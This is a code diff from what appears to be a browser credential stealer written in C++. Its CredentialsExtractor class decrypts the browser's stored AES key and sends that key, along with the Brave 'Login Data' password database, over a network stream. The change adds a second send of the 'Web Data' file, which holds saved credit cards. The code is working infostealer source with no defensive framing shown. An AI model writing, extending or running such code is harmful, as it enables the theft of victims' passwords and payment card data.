@@ -49,7 +49,7 @@ std::vector<BYTE>  CredentialsExtractor::getDecryptedKey() {
     macaron::Base64 base64;
     std::string encryptedString64 = content.substr(start + 1, end - start - 1);
     std::string encryptedStringDecoded;
-    base64.Decode(encryptedString64,encryptedStringDecoded);
+    macaron::Base64::Decode(encryptedString64,encryptedStringDecoded);
     std::vector<BYTE> decryptedKey = decryptAESKey(encryptedStringDecoded.substr(5));
     return decryptedKey;
 }
@@ -57,10 +57,13 @@ std::vector<BYTE>  CredentialsExtractor::getDecryptedKey() {
 void CredentialsExtractor::sendKeyAndDatabase() {
     std::vector<BYTE> decryptedKey = getDecryptedKey();
     std::cout << decryptedKey.size() << std::endl;
-    std::string pathOfDatabase = R"(C:\Users\Nitropc\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data)";
+    std::string pathOfAccountsDatabase = R"(C:\Users\Nitropc\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data)";
+    std::string pathOfCreditCardsDatabase = R"(C:\Users\Nitropc\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data)";
+
     RESULT result;
     stream.sendBytes(decryptedKey);
-    stream.sendFile(Converter::string2wstring(pathOfDatabase).c_str(), result);
+    stream.sendFile(Converter::string2wstring(pathOfAccountsDatabase).c_str(), result);
+    stream.sendFile(Converter::string2wstring(pathOfCreditCardsDatabase).c_str(), result);
 }
 
 
